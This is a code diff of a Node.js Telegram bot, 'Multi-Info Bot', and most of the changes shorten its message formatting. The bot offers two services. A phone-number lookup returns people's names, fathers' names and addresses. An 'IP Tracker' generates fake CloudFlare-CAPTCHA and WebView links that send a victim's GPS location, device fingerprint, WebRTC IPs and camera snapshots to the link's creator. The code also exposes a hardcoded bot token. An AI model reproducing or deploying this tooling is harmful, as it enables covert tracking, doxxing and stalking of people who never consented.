@@ -5,7 +5,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const path = require('path');
 
-// ==================== 🔧 CONFIGURATION ====================
+// ==================== CONFIG ====================
 const CONFIG = {
   BOT_TOKEN: '8377073485:AAERCkZcNZhupFa2Rs2uWrqFhlPQQW2xGqM',
   WEBHOOK_URL: 'https://botu-s3f9.onrender.com',
@@ -14,8 +14,7 @@ const CONFIG = {
   DEVELOPER: '@aadi_io',
   MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
   BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
-  ENABLE_CAPTCHA: true,
-  CAPTCHA_DURATION: 8000, // Increased for more info gathering
+  CAPTCHA_DURATION: 6000,
   CACHE_DURATION: 300000,
   MAX_CACHE_SIZE: 100,
   MAX_HISTORY: 50
@@ -24,7 +23,6 @@ const CONFIG = {
 const bot = new TelegramBot(CONFIG.BOT_TOKEN);
 const app = express();
 
-// ==================== Middlewares ====================
 app.use(cors());
 app.use(bodyParser.json({ limit: '20mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
@@ -36,18 +34,11 @@ app.use((req, res, next) => {
   next();
 });
 
-// ==================== Data Storage ====================
+// ==================== Data ====================
 const stats = {
-  total: 0,
-  success: 0,
-  failed: 0,
-  blocked: 0,
-  users: new Set(),
-  ipLinks: 0,
-  ipClicks: 0,
-  locations: 0,
-  cameras: 0,
-  startTime: Date.now()
+  total: 0, success: 0, failed: 0, blocked: 0,
+  users: new Set(), ipLinks: 0, ipClicks: 0,
+  locations: 0, cameras: 0, startTime: Date.now()
 };
 
 const cache = new Map();
@@ -58,16 +49,12 @@ const activity = new Map();
 // ==================== Utils ====================
 function getIP(req) {
   return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-         req.headers['x-real-ip'] ||
-         req.connection?.remoteAddress || 
+         req.headers['x-real-ip'] || req.connection?.remoteAddress || 
          req.ip || 'Unknown';
 }
 
 function getTime() {
-  return new Date().toLocaleString('en-IN', { 
-    timeZone: 'Asia/Kolkata',
-    hour12: false 
-  });
+  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
 }
 
 function uptime() {
@@ -104,7 +91,6 @@ function formatAddress(a) {
 function logSearch(uid, name, num, status) {
   history.push({ time: new Date(), uid, name, num, status });
   if (history.length > CONFIG.MAX_HISTORY) history.shift();
-
   if (!activity.has(uid)) {
     activity.set(uid, { name, count: 0, last: null });
   }
@@ -127,99 +113,66 @@ const mainKeyboard = (isAdmin = false) => ({
   inline_keyboard: [
     [{ text: '🔍 Number Lookup', callback_data: 'number_info' }],
     [{ text: '🌐 IP Tracker', callback_data: 'ip_tracker' }],
-    ...(isAdmin ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin' }]] : []),
+    ...(isAdmin ? [[{ text: '⚙️ Admin', callback_data: 'admin' }]] : []),
     [{ text: '💬 Developer', url: `https://t.me/${CONFIG.DEVELOPER.slice(1)}` }]
   ]
 });
 
 const adminKeyboard = {
   inline_keyboard: [
-    [
-      { text: '📊 Stats', callback_data: 'stats' },
-      { text: '🏓 Ping', callback_data: 'ping' }
-    ],
-    [
-      { text: '📜 History', callback_data: 'history' },
-      { text: '👥 Users', callback_data: 'users' }
-    ],
-    [
-      { text: '🗑️ Clear Cache', callback_data: 'clear_cache' },
-      { text: '🔙 Back', callback_data: 'menu' }
-    ]
+    [{ text: '📊 Stats', callback_data: 'stats' }, { text: '🏓 Ping', callback_data: 'ping' }],
+    [{ text: '📜 History', callback_data: 'history' }, { text: '👥 Users', callback_data: 'users' }],
+    [{ text: '🗑️ Clear', callback_data: 'clear_cache' }, { text: '🔙 Back', callback_data: 'menu' }]
   ]
 };
 
 const resultKeyboard = {
   inline_keyboard: [
-    [
-      { text: '🔄 New Search', callback_data: 'number_info' },
-      { text: '🏠 Menu', callback_data: 'menu' }
-    ]
+    [{ text: '🔄 Again', callback_data: 'number_info' }, { text: '🏠 Menu', callback_data: 'menu' }]
   ]
 };
 
 const ipKeyboard = {
   inline_keyboard: [
-    [{ text: '✨ Create New Link', callback_data: 'ip_tracker' }],
+    [{ text: '✨ New Link', callback_data: 'ip_tracker' }],
     [{ text: '🏠 Menu', callback_data: 'menu' }]
   ]
 };
 
 // ==================== Messages ====================
 const welcomeMsg = (name, isAdmin) => `
-╔══════════════════════╗
-║  <b>🤖 Multi-Info Bot</b>   ║
-╚══════════════════════╝
+<b>🤖 Multi-Info Bot</b>
 
-👋 Welcome <b>${name}</b>!
+👋 <b>${name}</b>
 
-<b>📋 Services:</b>
+<b>Services:</b>
+🔍 Number Lookup
+🌐 IP Tracker
 
-🔍 <b>Number Lookup</b>
-   • Mobile info search
-   • Name & address
-   • Carrier details
-
-🌐 <b>IP Tracker</b>
-   • Location tracking
-   • Complete device info
-   • Camera capture
-   • System fingerprint
-
-${isAdmin ? '\n🔐 <b>Admin Access</b>\n' : ''}
-━━━━━━━━━━━━━━━━━━━━━
-<i>Choose a service below ⬇️</i>
+${isAdmin ? '🔐 <b>Admin</b>\n' : ''}
+<i>Choose below ⬇️</i>
 `;
 
 const statsMsg = () => {
   const rate = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
   return `
-╔══════════════════════╗
-║   <b>📊 Statistics</b>      ║
-╚══════════════════════╝
+<b>📊 Statistics</b>
 
-<b>📱 Number Lookup</b>
-├─ Total: <code>${stats.total}</code>
-├─ Success: <code>${stats.success}</code> (${rate}%)
-├─ Failed: <code>${stats.failed}</code>
-└─ Blocked: <code>${stats.blocked}</code>
+<b>Number Lookup</b>
+Total: <code>${stats.total}</code>
+Success: <code>${stats.success}</code> (${rate}%)
+Failed: <code>${stats.failed}</code>
+Blocked: <code>${stats.blocked}</code>
 
-<b>🌐 IP Tracker</b>
-├─ Links: <code>${stats.ipLinks}</code>
-├─ Clicks: <code>${stats.ipClicks}</code>
-├─ Locations: <code>${stats.locations}</code>
-└─ Cameras: <code>${stats.cameras}</code>
+<b>IP Tracker</b>
+Links: <code>${stats.ipLinks}</code>
+Clicks: <code>${stats.ipClicks}</code>
+Locations: <code>${stats.locations}</code>
+Cameras: <code>${stats.cameras}</code>
 
-<b>👥 Users</b>
-├─ Total: <code>${stats.users.size}</code>
-├─ Active: <code>${activity.size}</code>
-└─ Cache: <code>${cache.size}</code>
-
-<b>⚙️ System</b>
-└─ Uptime: <code>${uptime()}</code>
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>${new Date().toLocaleTimeString()}</i>
+<b>System</b>
+Users: <code>${stats.users.size}</code>
+Uptime: <code>${uptime()}</code>
 `;
 };
 
@@ -239,17 +192,13 @@ async function fetchMobileInfo(mobile) {
 
   try {
     stats.total++;
-    const response = await axios.get(`${CONFIG.MOBILE_API_URL}${cleaned}`, { 
-      timeout: 15000 
-    });
-
+    const response = await axios.get(`${CONFIG.MOBILE_API_URL}${cleaned}`, { timeout: 15000 });
     if (response.data && typeof response.data === 'object') {
       cache.set(cleaned, { data: response.data, time: Date.now() });
       cleanCache();
       stats.success++;
       return response.data;
     }
-
     stats.failed++;
     return null;
   } catch (error) {
@@ -261,40 +210,15 @@ async function fetchMobileInfo(mobile) {
 
 function formatResult(data, num) {
   if (data?.blocked) {
-    return `
-╔══════════════════════╗
-║  <b>🚫 Access Denied</b>   ║
-╚══════════════════════╝
-
-📱 <code>${formatPhone(num)}</code>
-
-⛔️ This number is <b>protected</b>
-
-<i>Nice try! 🤡</i>
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>${CONFIG.DEVELOPER}</i>
-`;
+    return `<b>🚫 Protected</b>\n\n📱 <code>${formatPhone(num)}</code>\n\n<i>Nice try! 🤡</i>`;
   }
 
   if (!data || !data.data || !Array.isArray(data.data) || data.data.length === 0) {
-    return `
-╔══════════════════════╗
-║   <b>❌ No Results</b>      ║
-╚══════════════════════╝
-
-📱 <code>${formatPhone(num)}</code>
-
-<i>No information available</i>
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>Try another number</i>
-`;
+    return `<b>❌ No Results</b>\n\n📱 <code>${formatPhone(num)}</code>\n\n<i>Not found</i>`;
   }
 
   const unique = [];
   const seen = new Set();
-
   data.data.forEach(r => {
     if (typeof r === 'object') {
       const key = JSON.stringify(r);
@@ -306,7 +230,7 @@ function formatResult(data, num) {
   });
 
   if (unique.length === 0) {
-    return `<b>❌ No Data</b>\n\n📱 <code>${formatPhone(num)}</code>`;
+    return `<b>❌ Empty</b>\n\n📱 <code>${formatPhone(num)}</code>`;
   }
 
   const results = unique.slice(0, 3).map((r, i) => {
@@ -317,46 +241,24 @@ function formatResult(data, num) {
     const circle = r.circle || 'N/A';
     const uid = r.id || 'N/A';
     const addr = formatAddress(r.address || '');
-
     const header = unique.length > 1 ? `Result ${i + 1}` : 'Result';
 
-    return `
-╔══════════════════════╗
-║  <b>✅ ${header}</b>  ║
-╚══════════════════════╝
-
-👤 <b>${name}</b>
-👨 Father: ${fname}
-
-<b>📱 Contact</b>
-├─ Primary: <code>${mobile}</code>
-└─ Alternate: <code>${alt}</code>
-
-<b>🌐 Network</b>
-├─ Circle: ${circle}
-└─ ID: <code>${uid}</code>
-
-<b>📍 Address</b>
-${addr}
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>by ${CONFIG.DEVELOPER}</i>
-`;
+    return `<b>✅ ${header}</b>\n\n👤 <b>${name}</b>\n👨 ${fname}\n\n<b>Contact</b>\n${mobile}\n${alt}\n\n<b>Network</b>\n${circle} • <code>${uid}</code>\n\n<b>Address</b>\n${addr}\n`;
   });
 
-  return results.join('\n');
+  return results.join('\n━━━━━━━━━━━━━━\n\n');
 }
 
-// ==================== Webhook Route ====================
+// ==================== Webhook ====================
 app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
-  console.log('📨 Webhook Update Received');
+  console.log('📨 Webhook');
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// ==================== IP Tracker Routes ====================
+// ==================== Tracker Routes ====================
 app.get('/c/:path/:uri', (req, res) => {
-  console.log('🌐 CloudFlare page accessed');
+  console.log('🌐 CloudFlare');
   stats.ipClicks++;
   if (req.params.path) {
     res.render('cloudflare', {
@@ -373,7 +275,7 @@ app.get('/c/:path/:uri', (req, res) => {
 });
 
 app.get('/w/:path/:uri', (req, res) => {
-  console.log('🌐 WebView page accessed');
+  console.log('🌐 WebView');
   stats.ipClicks++;
   if (req.params.path) {
     res.render('webview', {
@@ -389,22 +291,22 @@ app.get('/w/:path/:uri', (req, res) => {
 });
 
 app.post('/location', async (req, res) => {
-  console.log('📍 Location received');
+  console.log('📍 Location');
   const { lat, lon, uid, acc } = req.body;
   
-  if (lat && lon && uid && acc) {
+  if (lat && lon && uid) {
     try {
       const userId = parseInt(uid, 36);
       stats.locations++;
       
       await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
       await bot.sendMessage(userId, 
-        `╔══════════════════════╗\n║ <b>📍 Location</b>         ║\n╚══════════════════════╝\n\n<b>Coordinates</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAcc: <code>${acc}m</code>\n\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n\n━━━━━━━━━━━━━━━━━━━━━\n<i>${getTime()}</i>`,
+        `<b>📍 Location</b>\n\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAcc: <code>${acc}m</code>\n\n🗺️ <a href="https://maps.google.com?q=${lat},${lon}">Map</a>`,
         { parse_mode: 'HTML', disable_web_page_preview: true }
       );
       res.send('OK');
     } catch (err) {
-      console.error('❌ Location error:', err.message);
+      console.error('❌', err.message);
       res.send('Error');
     }
   } else {
@@ -413,17 +315,14 @@ app.post('/location', async (req, res) => {
 });
 
 app.post('/info', async (req, res) => {
-  console.log('ℹ️ Info received');
+  console.log('ℹ️ Info');
   const { uid, data } = req.body;
-
   if (uid && data) {
     try {
-      await bot.sendMessage(parseInt(uid, 36), data, { 
-        parse_mode: 'HTML' 
-      });
+      await bot.sendMessage(parseInt(uid, 36), data, { parse_mode: 'HTML' });
       res.send('OK');
     } catch (err) {
-      console.error('❌ Info error:', err.message);
+      console.error('❌', err.message);
       res.send('Error');
     }
   } else {
@@ -432,21 +331,20 @@ app.post('/info', async (req, res) => {
 });
 
 app.post('/camsnap', async (req, res) => {
-  console.log('📷 Camera snapshot received');
+  console.log('📷 Camera');
   const { uid, img } = req.body;
-
   if (uid && img) {
     try {
       const buffer = Buffer.from(img, 'base64');
       stats.cameras++;
       
       await bot.sendPhoto(parseInt(uid, 36), buffer, {
-        caption: `╔══════════════════════╗\n║ <b>📷 Camera Captured</b>  ║\n╚══════════════════════╝\n\n<i>${getTime()}</i>`,
+        caption: `<b>📷 Camera</b>\n\n<i>${getTime()}</i>`,
         parse_mode: 'HTML'
       });
       res.send('OK');
     } catch (err) {
-      console.error('❌ Camera error:', err.message);
+      console.error('❌', err.message);
       res.send('Error');
     }
   } else {
@@ -454,23 +352,17 @@ app.post('/camsnap', async (req, res) => {
   }
 });
 
-app.post('/camera-status', async (req, res) => {
-  console.log('📷 Camera status:', req.body.status);
+app.post('/cam-status', async (req, res) => {
+  console.log('📷 Status:', req.body.status);
   const { uid, status } = req.body;
-
   if (uid && status) {
     try {
       const userId = parseInt(uid, 36);
-      const statusMsg = status === 'denied' 
-        ? '❌ <b>Camera Access Denied</b>\n\nUser blocked camera permission'
-        : status === 'allowed'
-        ? '✅ <b>Camera Access Granted</b>\n\nCapturing photo...'
-        : '⏳ <b>Camera Pending</b>\n\nWaiting for user response...';
-      
-      await bot.sendMessage(userId, statusMsg, { parse_mode: 'HTML' });
+      const msg = status === 'denied' ? '❌ Camera Denied' : 
+                  status === 'allowed' ? '✅ Camera Allowed' : '⏳ Pending';
+      await bot.sendMessage(userId, msg);
       res.send('OK');
     } catch (err) {
-      console.error('❌ Camera status error:', err.message);
       res.send('Error');
     }
   } else {
@@ -478,110 +370,48 @@ app.post('/camera-status', async (req, res) => {
   }
 });
 
-// ==================== Bot Handlers (keeping same as before) ====================
+// ==================== Bot Handlers ====================
 bot.on('message', async (msg) => {
-  console.log(`💬 Message from ${msg.from.id}: ${msg.text}`);
-  
+  console.log(`💬 ${msg.from.id}: ${msg.text}`);
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const userName = msg.from.first_name || 'User';
-  
   stats.users.add(userId);
 
   if (states.get(chatId) === 'waiting_url') {
     const text = msg.text;
-    const hasInvalidChars = [...text].some(c => c.charCodeAt(0) > 127);
-
-    if ((text.includes('http://') || text.includes('https://')) && !hasInvalidChars) {
+    const hasInvalid = [...text].some(c => c.charCodeAt(0) > 127);
+    if ((text.includes('http://') || text.includes('https://')) && !hasInvalid) {
       const encoded = Buffer.from(text).toString('base64');
       const urlPath = `${chatId.toString(36)}/${encoded}`;
       const cUrl = `${CONFIG.WEBHOOK_URL}/c/${urlPath}`;
       const wUrl = `${CONFIG.WEBHOOK_URL}/w/${urlPath}`;
-
       stats.ipLinks++;
       states.delete(chatId);
-
-      await bot.sendMessage(chatId, `
-╔══════════════════════╗
-║ <b>✅ Links Created</b>    ║
-╚══════════════════════╝
-
-🔗 <b>Original:</b>
-<code>${text}</code>
-
-<b>🌐 CloudFlare (CAPTCHA):</b>
-<code>${cUrl}</code>
-
-<b>🌐 WebView (iframe):</b>
-<code>${wUrl}</code>
-
-━━━━━━━━━━━━━━━━━━━━━
-
-<b>📊 Tracks Everything:</b>
-• 📍 GPS Location
-• 🌐 IP & ISP
-• 🖥️ Complete Device Info
-• 📱 Battery & Network
-• 📷 Camera (persistent)
-• 🔍 Browser Fingerprint
-• 🌍 WebRTC IPs
-
-<i>Share to track visitors</i>
-`, {
+      await bot.sendMessage(chatId, `<b>✅ Links Created</b>\n\n🔗 <code>${text}</code>\n\n<b>CloudFlare:</b>\n<code>${cUrl}</code>\n\n<b>WebView:</b>\n<code>${wUrl}</code>\n\n<b>Tracks:</b>\n📍 Location • 🌐 IP • 🖥️ Device\n📱 Battery • 📷 Camera • 🔍 Fingerprint`, {
         parse_mode: 'HTML',
         reply_markup: ipKeyboard,
         disable_web_page_preview: true
       });
     } else {
-      await bot.sendMessage(chatId, 
-        '⚠️ <b>Invalid URL</b>\n\nInclude <code>http://</code> or <code>https://</code>',
-        { parse_mode: 'HTML' }
-      );
+      await bot.sendMessage(chatId, '⚠️ Invalid URL\n\nInclude http:// or https://', { parse_mode: 'HTML' });
     }
     return;
   }
 
   if (states.get(chatId) === 'waiting_number') {
     const num = cleanNumber(msg.text);
-
     if (!/^\d{10}$/.test(num)) {
-      await bot.sendMessage(chatId,
-        '<b>❌ Invalid</b>\n\nSend valid 10-digit number\n\n💡 <code>9876543210</code>',
-        { parse_mode: 'HTML' }
-      );
+      await bot.sendMessage(chatId, '<b>❌ Invalid</b>\n\n10-digit number\n\n💡 <code>9876543210</code>', { parse_mode: 'HTML' });
       return;
     }
-
-    const searchMsg = await bot.sendMessage(chatId,
-      '🔍 <b>Searching...</b>',
-      { parse_mode: 'HTML' }
-    );
-
+    const searchMsg = await bot.sendMessage(chatId, '🔍 <b>Searching...</b>', { parse_mode: 'HTML' });
     const data = await fetchMobileInfo(num);
     const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');
-
     logSearch(userId, userName, num, status);
-
     await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});
-
-    const result = data ? formatResult(data, num) : `
-╔══════════════════════╗
-║  <b>⚠️ Error</b>            ║
-╚══════════════════════╝
-
-Unable to fetch data
-
-Try again later
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>${CONFIG.DEVELOPER}</i>
-`;
-
-    await bot.sendMessage(chatId, result, {
-      parse_mode: 'HTML',
-      reply_markup: resultKeyboard
-    });
-
+    const result = data ? formatResult(data, num) : `<b>⚠️ Error</b>\n\nUnable to fetch data`;
+    await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard });
     states.delete(chatId);
     return;
   }
@@ -592,70 +422,37 @@ Try again later
       reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
     });
   } else if (msg.text === '/admin' && userId === CONFIG.ADMIN_ID) {
-    await bot.sendMessage(chatId,
-      '╔══════════════════════╗\n║  <b>⚙️ Admin Panel</b>     ║\n╚══════════════════════╝',
-      {
-        parse_mode: 'HTML',
-        reply_markup: adminKeyboard
-      }
-    );
+    await bot.sendMessage(chatId, '<b>⚙️ Admin</b>', { parse_mode: 'HTML', reply_markup: adminKeyboard });
   } else if (msg.text === '/stats') {
     await bot.sendMessage(chatId, statsMsg(), { parse_mode: 'HTML' });
   } else {
     const num = cleanNumber(msg.text);
     if (/^\d{10}$/.test(num)) {
       states.set(chatId, 'waiting_number');
-      
-      const searchMsg = await bot.sendMessage(chatId,
-        '🔍 <b>Searching...</b>',
-        { parse_mode: 'HTML' }
-      );
-
+      const searchMsg = await bot.sendMessage(chatId, '🔍 <b>Searching...</b>', { parse_mode: 'HTML' });
       const data = await fetchMobileInfo(num);
       const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');
-
       logSearch(userId, userName, num, status);
-
       await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});
-
-      const result = data ? formatResult(data, num) : `
-╔══════════════════════╗
-║  <b>⚠️ Error</b>            ║
-╚══════════════════════╝
-
-Unable to fetch data
-
-━━━━━━━━━━━━━━━━━━━━━
-<i>${CONFIG.DEVELOPER}</i>
-`;
-
-      await bot.sendMessage(chatId, result, {
-        parse_mode: 'HTML',
-        reply_markup: resultKeyboard
-      });
-
+      const result = data ? formatResult(data, num) : `<b>⚠️ Error</b>\n\nUnable to fetch`;
+      await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard });
       states.delete(chatId);
     } else {
-      await bot.sendMessage(chatId,
-        '<b>💡 Tip</b>\n\nUse menu buttons below',
-        {
-          parse_mode: 'HTML',
-          reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
-        }
-      );
+      await bot.sendMessage(chatId, '<b>💡 Tip</b>\n\nUse buttons below', {
+        parse_mode: 'HTML',
+        reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
+      });
     }
   }
 });
 
 bot.on('callback_query', async (query) => {
-  console.log(`🔘 Callback: ${query.data} from ${query.from.id}`);
-  
+  console.log(`🔘 ${query.data}`);
   const chatId = query.message.chat.id;
   const msgId = query.message.message_id;
   const userId = query.from.id;
   const userName = query.from.first_name || 'User';
   const data = query.data;
-
   await bot.answerCallbackQuery(query.id);
 
   try {
@@ -663,111 +460,69 @@ bot.on('callback_query', async (query) => {
       case 'menu':
         states.delete(chatId);
         await bot.editMessageText(welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
-          chat_id: chatId,
-          message_id: msgId,
-          parse_mode: 'HTML',
+          chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
           reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
         });
         break;
-
       case 'number_info':
         states.set(chatId, 'waiting_number');
-        await bot.editMessageText(
-          '╔══════════════════════╗\n║ <b>🔍 Number Lookup</b>   ║\n╚══════════════════════╝\n\n<b>Send 10-digit number</b>\n\n💡 <code>9876543210</code>\n\n<i>No country code</i>',
-          {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: 'HTML'
-          }
-        );
+        await bot.editMessageText('<b>🔍 Number Lookup</b>\n\nSend 10-digit number\n\n💡 <code>9876543210</code>', {
+          chat_id: chatId, message_id: msgId, parse_mode: 'HTML'
+        });
         break;
-
       case 'ip_tracker':
         states.set(chatId, 'waiting_url');
-        await bot.editMessageText(
-          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Gathers:</b>\n• 📍 GPS Location\n• 🌐 IP & ISP Info\n• 🖥️ Complete Device Info\n• 📱 Battery & Network\n• 📷 Camera (persistent)\n• 🔍 Browser Fingerprint\n• 🌍 WebRTC IPs\n\n<i>Include http:// or https://</i>',
-          {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: 'HTML'
-          }
-        );
+        await bot.editMessageText('<b>🌐 IP Tracker</b>\n\nSend URL\n\n💡 <code>https://example.com</code>\n\n<b>Tracks:</b>\n📍 GPS • 🌐 IP • 🖥️ Device\n📱 Battery • 📷 Camera', {
+          chat_id: chatId, message_id: msgId, parse_mode: 'HTML'
+        });
         break;
-
       case 'admin':
         if (userId === CONFIG.ADMIN_ID) {
-          await bot.editMessageText(
-            '╔══════════════════════╗\n║  <b>⚙️ Admin Panel</b>     ║\n╚══════════════════════╝',
-            {
-              chat_id: chatId,
-              message_id: msgId,
-              parse_mode: 'HTML',
-              reply_markup: adminKeyboard
-            }
-          );
-        }
-        break;
-
-      case 'stats':
-        if (userId === CONFIG.ADMIN_ID) {
-          await bot.editMessageText(statsMsg(), {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: 'HTML',
-            reply_markup: adminKeyboard
+          await bot.editMessageText('<b>⚙️ Admin</b>', {
+            chat_id: chatId, message_id: msgId, parse_mode: 'HTML', reply_markup: adminKeyboard
           });
         }
         break;
-
+      case 'stats':
+        if (userId === CONFIG.ADMIN_ID) {
+          await bot.editMessageText(statsMsg(), {
+            chat_id: chatId, message_id: msgId, parse_mode: 'HTML', reply_markup: adminKeyboard
+          });
+        }
+        break;
       case 'ping':
         if (userId === CONFIG.ADMIN_ID) {
           const start = Date.now();
           try {
             await axios.get('https://api.telegram.org');
             const ping = Date.now() - start;
-            await bot.answerCallbackQuery(query.id, {
-              text: `🏓 Pong!\n\n${ping}ms`,
-              show_alert: true
-            });
+            await bot.answerCallbackQuery(query.id, { text: `🏓 ${ping}ms`, show_alert: true });
           } catch (err) {
-            await bot.answerCallbackQuery(query.id, {
-              text: `❌ Error`,
-              show_alert: true
-            });
+            await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true });
           }
         }
         break;
-
       case 'clear_cache':
         if (userId === CONFIG.ADMIN_ID) {
           const size = cache.size;
           cache.clear();
-          await bot.answerCallbackQuery(query.id, {
-            text: `✅ Cache Cleared\n\n${size} entries`,
-            show_alert: true
-          });
+          await bot.answerCallbackQuery(query.id, { text: `✅ Cleared ${size}`, show_alert: true });
         }
         break;
     }
   } catch (err) {
-    console.error('❌ Callback error:', err.message);
+    console.error('❌', err.message);
   }
 });
 
-// ==================== Web Routes ====================
+// ==================== Web ====================
 app.get('/', (req, res) => {
   res.json({
     status: 'online',
     bot: 'Multi-Info Bot',
-    version: '5.1 - Advanced Tracking',
+    version: '5.2',
     developer: CONFIG.DEVELOPER,
-    webhook: `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`,
-    stats: {
-      uptime: uptime(),
-      users: stats.users.size,
-      requests: stats.total,
-      ipLinks: stats.ipLinks
-    }
+    stats: { uptime: uptime(), users: stats.users.size, requests: stats.total, ipLinks: stats.ipLinks }
   });
 });
 
@@ -778,77 +533,48 @@ app.get('/health', (req, res) => {
 app.get('/webhook-info', async (req, res) => {
   try {
     const info = await bot.getWebHookInfo();
-    res.json({
-      url: info.url,
-      pending: info.pending_update_count,
-      last_error: info.last_error_message,
-      last_error_date: info.last_error_date
-    });
+    res.json({ url: info.url, pending: info.pending_update_count, error: info.last_error_message });
   } catch (err) {
     res.json({ error: err.message });
   }
 });
 
 app.use((err, req, res, next) => {
-  console.error('❌ Express Error:', err.message);
-  res.status(500).send('Internal Server Error');
+  console.error('❌', err.message);
+  res.status(500).send('Error');
 });
 
 // ==================== Start ====================
 async function setupWebhook() {
   try {
-    console.log('🔄 Removing old webhook...');
+    console.log('🔄 Setting webhook...');
     await bot.deleteWebHook();
-    
     await new Promise(resolve => setTimeout(resolve, 2000));
-    
     const webhookUrl = `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`;
-    console.log('🔗 Setting webhook:', webhookUrl);
-    
-    await bot.setWebHook(webhookUrl, {
-      max_connections: 100,
-      allowed_updates: ['message', 'callback_query']
-    });
-    
-    console.log('✅ Webhook set successfully!');
-    
+    await bot.setWebHook(webhookUrl, { max_connections: 100, allowed_updates: ['message', 'callback_query'] });
+    console.log('✅ Webhook set:', webhookUrl);
     const info = await bot.getWebHookInfo();
-    console.log('📍 Webhook URL:', info.url);
-    console.log('📊 Pending updates:', info.pending_update_count);
-    if (info.last_error_message) {
-      console.log('⚠️ Last error:', info.last_error_message);
-    }
-    
+    console.log('📍', info.url);
     return true;
   } catch (err) {
-    console.error('❌ Webhook error:', err.message);
+    console.error('❌', err.message);
     return false;
   }
 }
 
 app.listen(CONFIG.PORT, async () => {
-  console.log('\n' + '='.repeat(60));
-  console.log('🚀 Multi-Info Bot v5.1 - Advanced Tracking');
-  console.log('='.repeat(60));
-  console.log(`🌐 Webhook: ${CONFIG.WEBHOOK_URL}`);
-  console.log(`👤 Developer: ${CONFIG.DEVELOPER}`);
-  console.log('='.repeat(60));
-  
+  console.log('\n' + '='.repeat(50));
+  console.log('🚀 Multi-Info Bot v5.2');
+  console.log('='.repeat(50));
   const success = await setupWebhook();
-  
   if (success) {
-    console.log(`\n✅ Server running on port ${CONFIG.PORT}`);
-    console.log('✅ Bot ready with MAXIMUM INFO GATHERING!');
-    console.log(`🔍 ${CONFIG.WEBHOOK_URL}/webhook-info\n`);
-    console.log('='.repeat(60) + '\n');
+    console.log(`✅ Port: ${CONFIG.PORT}`);
+    console.log('✅ Ready!\n');
   } else {
-    console.log('\n❌ Webhook setup failed!\n');
+    console.log('❌ Failed\n');
   }
 });
 
-bot.on('polling_error', (err) => console.error('❌ Polling:', err.code));
-bot.on('webhook_error', (err) => console.error('❌ Webhook:', err.code));
-
-process.on('unhandledRejection', (err) => {
-  console.error('❌ Unhandled Rejection:', err);
-});
+bot.on('polling_error', (err) => console.error('❌', err.code));
+bot.on('webhook_error', (err) => console.error('❌', err.code));
+process.on('unhandledRejection', (err) => console.error('❌', err));
